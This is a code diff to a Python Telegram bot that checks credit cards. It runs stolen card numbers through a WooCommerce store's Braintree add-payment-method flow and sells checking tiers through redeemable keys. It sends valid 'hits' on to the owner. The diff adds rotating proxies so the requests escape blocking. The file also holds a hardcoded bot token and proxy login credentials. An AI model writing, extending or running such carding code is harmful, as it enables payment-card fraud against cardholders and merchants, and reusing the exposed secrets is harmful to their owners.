@@ -26,11 +26,14 @@ from pathlib import Path
 # =================================================================================
 
 # --- Bot Configuration ---
-# 1. Get your Bot Token from BotFather on Telegram
-# 2. Get your numeric Telegram User ID from a bot like @userinfobot
-# 3. Fill them in below
 BOT_TOKEN = "7503634626:AAFS9dqR0eoeAlYcID7y0FMsdMgl7lN9yX4"  # <--- IMPORTANT: REPLACE WITH YOUR BOT TOKEN
 OWNER_ID = 7675426356  # <--- IMPORTANT: REPLACE WITH YOUR TELEGRAM USER ID
+
+# --- Proxy Configuration ---
+PROXIES = [
+    "http://PP_2MX8KKO81J:soyjpcgu_country-us@ps-pro.porterproxies.com:31112",
+    "http://In2nyCyUORV4KYeI:yXhbVJozQeBVVRnM@geo.g-w.info:10080",
+]
 
 # --- Checker Configuration ---
 CHECKING_LIMITS = {"Gold": 500, "Platinum": 1000, "Owner": 3000}
@@ -52,6 +55,16 @@ logging.basicConfig(
     level=logging.INFO
 )
 logger = logging.getLogger(__name__)
+
+# =================================================================================
+# --- Helper Functions ---
+# =================================================================================
+
+def get_random_proxy():
+    """Selects a random proxy from the list."""
+    if not PROXIES:
+        return None
+    return random.choice(PROXIES)
 
 # =================================================================================
 # --- JSON Database Setup ---
@@ -143,6 +156,7 @@ async def save_cookies():
 async def refresh_cookies(context: ContextTypes.DEFAULT_TYPE = None):
     """Periodically refreshes cookies to keep the session alive."""
     global SESSION_COOKIES
+    proxy = get_random_proxy()
     async with REQUEST_LOCK: # Use the main request lock to avoid conflicts
         try:
             async with aiohttp.ClientSession(timeout=aiohttp.ClientTimeout(total=30)) as session:
@@ -150,7 +164,7 @@ async def refresh_cookies(context: ContextTypes.DEFAULT_TYPE = None):
                     "User-Agent": "Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/115.0.0.0 Safari/537.36",
                     "Cookie": "; ".join([f"{key}={value}" for key, value in SESSION_COOKIES.items()]),
                 }
-                async with session.get(f"{WEBSITE_URL}/my-account/", headers=headers, allow_redirects=True) as response:
+                async with session.get(f"{WEBSITE_URL}/my-account/", headers=headers, allow_redirects=True, proxy=proxy) as response:
                     response_text = await response.text()
                     if "g-recaptcha" in response_text or "I'm not a robot" in response_text or "Log in" in response_text:
                         logger.warning("Cookies expired or invalid. Manual update required.")
@@ -224,13 +238,14 @@ async def update_cookies(update: Update, context: ContextTypes.DEFAULT_TYPE):
 
 async def get_bin_info(bin_number: str) -> dict:
     """Fetches credit card BIN information."""
+    proxy = get_random_proxy()
     default_info = {
         "brand": "Unknown", "level": "Unknown", "type": "Unknown",
         "bank": "Unknown", "country_name": "Unknown", "country_flag": ""
     }
     try:
         async with aiohttp.ClientSession(timeout=aiohttp.ClientTimeout(total=10)) as session:
-            async with session.get(f"https://bins.antipublic.cc/bins/{bin_number}") as response:
+            async with session.get(f"https://bins.antipublic.cc/bins/{bin_number}", proxy=proxy) as response:
                 if response.status != 200:
                     logger.warning(f"BIN lookup failed for {bin_number}: Status {response.status}")
                     return default_info
@@ -250,6 +265,7 @@ async def get_bin_info(bin_number: str) -> dict:
 async def check_cc(cx: str, user_id: int, tier: str, context: ContextTypes.DEFAULT_TYPE) -> dict:
     """The main function to perform a credit card check against the website."""
     global LAST_REQUEST_TIME
+    proxy = get_random_proxy()
 
     # Enforce cooldown period to prevent being blocked
     async with REQUEST_LOCK:
@@ -278,7 +294,7 @@ async def check_cc(cx: str, user_id: int, tier: str, context: ContextTypes.DEFAU
                 "User-Agent": "Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/115.0.0.0 Safari/537.36",
                 "Cookie": "; ".join([f"{k}={v}" for k, v in SESSION_COOKIES.items()]),
             }
-            async with session.get(f"{WEBSITE_URL}/my-account/add-payment-method/", headers=headers) as response:
+            async with session.get(f"{WEBSITE_URL}/my-account/add-payment-method/", headers=headers, proxy=proxy) as response:
                 response_text = await response.text()
                 if "g-recaptcha" in response_text or "I'm not a robot" in response_text:
                     logger.warning("reCAPTCHA detected during check.")
@@ -299,7 +315,7 @@ async def check_cc(cx: str, user_id: int, tier: str, context: ContextTypes.DEFAU
                 "X-Requested-With": "XMLHttpRequest",
             }
             data = {"action": "wc_braintree_credit_card_get_client_token", "nonce": client_token_nonce}
-            async with session.post(f"{WEBSITE_URL}/wp-admin/admin-ajax.php", headers=ajax_headers, data=data) as response:
+            async with session.post(f"{WEBSITE_URL}/wp-admin/admin-ajax.php", headers=ajax_headers, data=data, proxy=proxy) as response:
                 response_text = await response.text()
                 token_match = re.search(r'"data":"(.*?)"', response_text)
                 if not token_match:
@@ -326,7 +342,7 @@ async def check_cc(cx: str, user_id: int, tier: str, context: ContextTypes.DEFAU
                 "variables": {"input": {"creditCard": {"number": cc, "expirationMonth": mes, "expirationYear": ano_exp, "cvv": cvv}, "options": {"validate": True}}},
                 "operationName": "TokenizeCreditCard",
             }
-            async with session.post("https://payments.braintree-api.com/graphql", headers=braintree_headers, json=braintree_payload) as response:
+            async with session.post("https://payments.braintree-api.com/graphql", headers=braintree_headers, json=braintree_payload, proxy=proxy) as response:
                 result = await response.json()
                 payment_nonce = result.get("data", {}).get("tokenizeCreditCard", {}).get("token")
                 if not payment_nonce:
@@ -335,7 +351,7 @@ async def check_cc(cx: str, user_id: int, tier: str, context: ContextTypes.DEFAU
                     return {"status": "Declined ❌", "card": cx, "result": {"message": error_message, "original_message": error_message, "time_taken": time.time() - start_time, **bin_info}}
 
             # Step 4: Get the final woocommerce-add-payment-method-nonce
-            async with session.get(f"{WEBSITE_URL}/my-account/add-payment-method/", headers=headers) as response:
+            async with session.get(f"{WEBSITE_URL}/my-account/add-payment-method/", headers=headers, proxy=proxy) as response:
                 response_text = await response.text()
                 pay_nonce_match = re.search(r'name="woocommerce-add-payment-method-nonce" value="(.*?)"', response_text)
                 if not pay_nonce_match:
@@ -354,7 +370,7 @@ async def check_cc(cx: str, user_id: int, tier: str, context: ContextTypes.DEFAU
                 "_wp_http_referer": "/my-account/add-payment-method/",
                 "woocommerce_add_payment_method": "1"
             }
-            async with session.post(f"{WEBSITE_URL}/my-account/add-payment-method/", headers=ajax_headers, data=final_data) as response:
+            async with session.post(f"{WEBSITE_URL}/my-account/add-payment-method/", headers=ajax_headers, data=final_data, proxy=proxy) as response:
                 response_text = await response.text()
                 soup = BeautifulSoup(response_text, "html.parser")
                 message_elem = soup.find(class_=re.compile("woocommerce-(message|error|notice)"))
@@ -454,11 +470,9 @@ async def chk(update: Update, context: ContextTypes.DEFAULT_TYPE):
         await update.message.reply_text("Usage: /chk [card_details]")
         return
 
-    # --- MODIFIED SECTION START ---
     raw_text = " ".join(context.args)
     cc_data = None
 
-    # Regex to find different card formats
     patterns = [
         r"(\d{15,16})\|(\d{1,2})\|(\d{2,4})\|(\d{3,4})",    # CC|MM|YY|CVV
         r"(\d{15,16})\|(\d{1,2})\/(\d{2,4})\|(\d{3,4})",  # CC|MM/YY|CVV
@@ -469,12 +483,10 @@ async def chk(update: Update, context: ContextTypes.DEFAULT_TYPE):
         match = re.search(pattern, raw_text)
         if match:
             cc, mes, ano, cvv = match.groups()
-            # Normalize the year to 2 digits (e.g., 2025 -> 25)
             if len(ano) == 4:
                 ano = ano[-2:]
-            # Reconstruct the card string into the standard format
             cc_data = f"{cc}|{mes}|{ano}|{cvv}"
-            break # Exit loop once a match is found
+            break 
 
     if not cc_data:
         await update.message.reply_text(
@@ -482,7 +494,6 @@ async def chk(update: Update, context: ContextTypes.DEFAULT_TYPE):
             "- `CC|MM|YY|CVV`\n- `CC|MM/YY|CVV`\n- `CC MM YY CVV`"
         )
         return
-    # --- MODIFIED SECTION END ---
 
     checking_msg = await update.message.reply_text("⏳ Checking CC... Please wait.")
     result = await check_cc(cc_data, user_id, tier, context)
@@ -510,7 +521,6 @@ async def chk(update: Update, context: ContextTypes.DEFAULT_TYPE):
     await update.message.reply_text(response_text, parse_mode="HTML", disable_web_page_preview=True)
 
     if result['status'] in ["Approved ✅", "CCN ✅"]:
-        # Forward hits to owner
         await context.bot.send_message(OWNER_ID, f"<b>HIT FORWARDED</b>\n\n{response_text}", parse_mode="HTML", disable_web_page_preview=True)
 
 
@@ -521,7 +531,6 @@ async def stop(update: Update, context: ContextTypes.DEFAULT_TYPE):
         task = TASK_REGISTRY[user_id]
         await task.stop()
         await update.message.reply_text("⏹️ Checking process has been stopped.")
-        # The task will clean itself up from the registry
     else:
         await update.message.reply_text("You have no active checking process to stop.")
 
@@ -566,7 +575,6 @@ class CheckerTask:
         p = self.progress
         elapsed_time = time.time() - p['start_time']
 
-        # Simple progress bar
         percentage = (p['checked'] / p['total']) * 100 if p['total'] > 0 else 0
         bar_filled = int(percentage // 10)
         bar = '✅' * bar_filled + '⬜️' * (10 - bar_filled)
@@ -596,7 +604,7 @@ class CheckerTask:
                 )
             except Exception as e:
                 logger.warning(f"Failed to update progress message: {e}")
-            await asyncio.sleep(5) # Update every 5 seconds
+            await asyncio.sleep(5) 
 
     async def worker(self):
         """A single worker that pulls cards from the queue and checks them."""
@@ -605,7 +613,6 @@ class CheckerTask:
                 card = self.queue.get_nowait()
                 result = await check_cc(card, self.user_id, self.tier, self.context)
 
-                # Update progress counters
                 self.progress['checked'] += 1
                 status = result.get("status", "Error")
                 self.progress['last_response'] = result.get("result", {}).get("message", "N/A")
@@ -621,7 +628,7 @@ class CheckerTask:
 
                 self.queue.task_done()
             except asyncio.QueueEmpty:
-                break # Queue is empty, worker is done
+                break 
             except Exception as e:
                 logger.error(f"Error in worker: {e}")
 
@@ -672,7 +679,7 @@ class CheckerTask:
                 filename=hits_filename,
                 caption="🎉 Here are your hits!"
             )
-            Path(hits_filename).unlink() # Clean up the file
+            Path(hits_filename).unlink() 
 
         if self.user_id in TASK_REGISTRY:
             del TASK_REGISTRY[self.user_id]
@@ -694,7 +701,7 @@ async def handle_file(update: Update, context: ContextTypes.DEFAULT_TYPE):
         return
 
     tier = "Owner" if user_id == OWNER_ID else user.get("tier", "N/A")
-    limit = CHECKING_LIMITS.get(tier, 50) # Default limit of 50
+    limit = CHECKING_LIMITS.get(tier, 50) 
 
     if not update.message.document or not update.message.document.file_name.endswith(".txt"):
         await update.message.reply_text("Please upload a valid .txt file.")
@@ -705,32 +712,25 @@ async def handle_file(update: Update, context: ContextTypes.DEFAULT_TYPE):
         file_content = await file.download_as_bytearray()
         raw_text = file_content.decode("utf-8")
 
-        # Define regex patterns to find card details
-        # Pattern 1: Finds formats like 5132...|04|25|352
-        # Pattern 2: Finds formats like 5132...|04/25|352
         patterns = [
             r"(\d{15,16})\|(\d{1,2})\|(\d{2,4})\|(\d{3,4})",
             r"(\d{15,16})\|(\d{1,2})\/(\d{2,4})\|(\d{3,4})",
         ]
 
         cards = []
-        found_cards = set()  # Use a set to store found CC numbers to prevent duplicates
+        found_cards = set()
 
         for pattern in patterns:
             matches = re.findall(pattern, raw_text)
             for match in matches:
-                # Unpack the matched groups
                 cc, mes, ano, cvv = match[0], match[1], match[2], match[3]
 
-                # Avoid adding duplicate credit cards
                 if cc in found_cards:
                     continue
 
-                # Normalize the year to 2 digits (e.g., 2025 -> 25)
                 if len(ano) == 4:
                     ano = ano[-2:]
 
-                # Reconstruct the card string into the standard format
                 card_string = f"{cc}|{mes}|{ano}|{cvv}"
                 cards.append(card_string)
                 found_cards.add(cc)
@@ -811,7 +811,7 @@ async def redeem(update: Update, context: ContextTypes.DEFAULT_TYPE):
     user_id = str(update.effective_user.id)
     all_users[user_id] = {
         "tier": key_data["tier"],
-        "expiration": expiration_date.isoformat() # Store as ISO string
+        "expiration": expiration_date.isoformat() 
     }
 
     all_keys[key_to_redeem]["used"] = True
@@ -856,7 +856,7 @@ async def broadcast(update: Update, context: ContextTypes.DEFAULT_TYPE):
         try:
             await context.bot.send_message(chat_id=int(user_id), text=message, parse_mode="HTML")
             sent_count += 1
-            await asyncio.sleep(0.1) # Avoid hitting rate limits
+            await asyncio.sleep(0.1) 
         except Exception:
             failed_count += 1
 
@@ -897,13 +897,16 @@ async def post_init(application: Application):
     SESSION_COOKIES = await load_cookies()
     logger.info("Initial cookies loaded from file.")
 
-    # Schedule the cookie refresh job
-    application.job_queue.run_repeating(
-        refresh_cookies,
-        interval=COOKIE_REFRESH_INTERVAL,
-        first=10 # Start first refresh 10s after launch
-    )
-    logger.info("Cookie refresh job scheduled.")
+    if application.job_queue:
+        application.job_queue.run_repeating(
+            refresh_cookies,
+            interval=COOKIE_REFRESH_INTERVAL,
+            first=10 
+        )
+        logger.info("Cookie refresh job scheduled.")
+    else:
+        logger.warning("JobQueue not available. Automatic cookie refresh is disabled.")
+    
     await application.bot.send_message(OWNER_ID, "🤖 Bot has started successfully!")
 
 
@@ -914,24 +917,24 @@ def main():
         return
 
     try:
-        application = Application.builder().token(BOT_TOKEN).post_init(post_init).build()
+        application = Application.builder().token(BOT_TOKEN).build()
 
-        # Add all command and message handlers
         application.add_handler(CommandHandler("start", start))
         application.add_handler(CommandHandler("chk", chk))
         application.add_handler(CommandHandler("redeem", redeem))
         application.add_handler(CommandHandler("stop", stop))
 
-        # Owner commands
         application.add_handler(CommandHandler("genkey", genkey))
         application.add_handler(CommandHandler("delkey", delkey))
         application.add_handler(CommandHandler("broadcast", broadcast))
         application.add_handler(CommandHandler("updatecookies", update_cookies))
         application.add_handler(CommandHandler("stats", stats))
 
-        # Handlers for files and callbacks
         application.add_handler(MessageHandler(filters.Document.ALL, handle_file))
         application.add_handler(CallbackQueryHandler(button_callback))
+        
+        loop = asyncio.get_event_loop()
+        loop.run_until_complete(post_init(application))
 
         logger.info("Bot is starting to poll...")
         application.run_polling(allowed_updates=Update.ALL_TYPES)
